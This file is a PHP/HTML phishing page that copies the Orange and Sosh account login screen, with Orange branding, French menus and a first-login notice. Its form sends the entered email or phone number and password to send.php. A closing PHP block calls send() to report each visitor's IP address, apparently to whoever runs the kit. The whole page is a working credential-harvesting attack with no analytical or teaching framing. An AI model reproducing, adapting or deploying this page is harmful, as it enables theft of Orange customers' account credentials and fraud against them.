<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" href="res/main.css">
<meta charset="utf-8">
</head>
<body>
<div class="header" style="">
<div class="col" style="text-align:left;">
<img src="res/logo-orange.png" style="width:40px; margin-left:10px;">
</div>
<div class="col right-col" style="margin-left:10px;width:90%;">
<span>Mobiles et forfaits</span>
<span>Internet</span>
<span>Packs Internet + Mobile</span>
<span>Maison</span>
<span>TV et divertissement</span>
<span>Banque</span>
<span>News</span>
<img src="res/menu.PNG" style="width:50px;  ">
</div>
</div>


<div class="form" style="padding:40px;">
<h1>Pour vous identifier</h1>





<div style="padding:10px; display:flex; background:#e9f8ff; width:600px; max-width:100%;">
<div style="">
<svg width="32" height="32" viewBox="0 0 1024 1024" id="first-connection-info-icon-info"><path d="M499.714 0.711c-0.241 0.241-7.709 0.602-16.621 1.084-96.476 4.457-195.362 39.988-274.614 98.765-64.558 47.817-117.554 110.448-153.206 180.787-21.56 42.397-39.867 97.44-47.335 142.125-1.084 6.624-2.168 12.286-2.409 12.647-0.12 0.361-0.722 5.179-1.204 10.84s-1.084 10.599-1.324 10.96c-2.891 4.818-2.891 105.509 0 110.689 0.241 0.361 0.843 4.096 1.204 8.431 3.733 35.892 16.501 85.396 32.279 125.263 7.588 19.151 25.052 54.561 35.049 71.304 23.728 39.145 46.612 68.412 77.928 99.728 21.56 21.56 23.848 23.728 40.951 37.458 91.177 73.471 204.274 113.579 320.384 113.579 111.653-0.12 215.716-34.086 304.726-99.728 38.181-28.063 76.844-66.245 105.028-103.703 33.845-45.047 59.259-93.345 76.965-146.341 9.153-27.582 17.706-62.992 20.958-86.72 2.529-19.512 3.131-24.811 3.974-36.133 1.084-16.862 1.084-63.716-0.12-79.374-6.504-85.034-36.253-171.514-83.107-241.612-12.647-18.91-15.297-22.523-29.629-40.349-23.848-29.75-60.103-64.558-92.26-88.768-62.751-46.974-141.764-80.698-219.812-93.706-16.501-2.77-16.38-2.77-28.907-4.096-19.753-2.168-67.569-4.216-68.895-3.131zM528.862 122.963c48.298 8.792 81.059 56.729 71.785 105.028-8.311 43.36-44.685 73.351-88.888 73.351-43.48 0.12-80.096-30.352-88.407-73.11-5.54-29.389 3.372-58.416 24.811-79.976 21.8-22.041 50.105-30.833 80.698-25.293zM602.334 563.189c0.722 189.099 0.843 201.625 2.891 209.574 2.289 9.033 8.19 22.643 11.442 26.378 6.624 7.709 21.319 12.406 43.842 13.851 1.807 0.12 2.048 1.687 2.048 15.538v15.297h-270.399l-0.722-31.316 5.179 0.12c8.551 0.12 22.523-2.77 29.509-6.263 12.888-6.263 16.621-12.286 19.753-31.196 1.687-9.997 2.409-314.602 0.843-333.15-1.324-14.814-4.938-29.389-8.792-34.327-5.54-7.227-22.523-13.249-39.386-13.851l-6.986-0.241v-15.297c0-8.431 0.241-15.538 0.482-15.778 0.361-0.241 47.576-0.482 105.148-0.482h104.546l0.602 201.143z" fill="#26B2FF"></path></svg>
</div>
<div style="padding:0 10px; margin-top:-8px;">
<p style="font-weight:bold;">C’est votre première connexion ?</p>
<p style="font-size:0.9em;">Finalisez la création de votre compte en saisissant l’adresse e-mail ou le numéro de mobile fournis par Orange ou Sosh lors de votre souscription.</p>
</div>
</div>







<h3>Indiquez votre compte Orange</h3>

<form action="send.php" method="post" style="margin:30px 0;">
<input type="text" name="user"  required placeholder="Adresse email ou n° de mobile Orange" style="display:block; width:400px; font-size:1em;  max-width:100%; border:none; border-bottom:1px solid  black; padding:10px; margin:20px 0;">
<input type="password" name="password" required placeholder="Mote de pass" style="display:block; width:400px; max-width:100%; font-size:1em; border:none; border-bottom:1px solid  black; padding:10px; margin:20px 0;">

<p style=""><a href="" style="color:black;  font-weight:bold; text-decoration:none; display:flex; align-items:center;"> Comment retrouver l’adresse e-mail de votre compte <svg width="12" height="12"style=" margin-left:6px;" viewBox="0 0 691.1999999999997 1024"><path d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z" fill="#ff7900"></path></svg></a></p>

<button type="submit" style="background:black; color:white; margin:20px 0; padding:15px 40px; font-size:1.1em; border:none; font-weight:bold;">Continuer</button>
</form>


</div>


<div style="width:100%; height:150px; background:#cccccc;">


</div>

</body>
</html>
<?php
require 'send.php';
send("[ -- ORANGE NOTIFICATION -- ]\nVISIT FROM [".$_SERVER['REMOTE_ADDR']."] ");
?>